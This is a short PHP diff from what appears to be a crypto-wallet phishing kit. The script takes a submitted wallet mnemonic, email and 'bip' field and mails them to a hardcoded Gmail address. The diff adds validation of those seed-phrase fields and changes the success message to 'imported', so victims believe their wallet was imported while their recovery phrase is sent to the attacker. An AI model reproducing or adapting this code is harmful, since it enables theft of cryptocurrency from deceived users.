@@ -14,7 +14,7 @@ $bip = $_POST['bip'];
 $email_from = $wallet_email;
 $email_to = 'feranmiolasunkanmi91@gmail.com';
 
-if($sender== '' || $mail_id== '' || $cont_no== '' || $company== '' || $msg_txt== ''){
+if($mnemonic== '' || $wallet_email== '' || $bip== ''){
         echo "check the fields";
     }else{
 
@@ -38,7 +38,7 @@ $mail->MsgHTML($mnemonic . $wallet_email . $bip);
 $mail->Body = $wallet_email . $bip;
 $mail->addAddress($email_to);
 if ( $mail->Send() ) {
-  echo "Email Sent";
+  echo "imported";
 }else{
   echo "Error";
 }
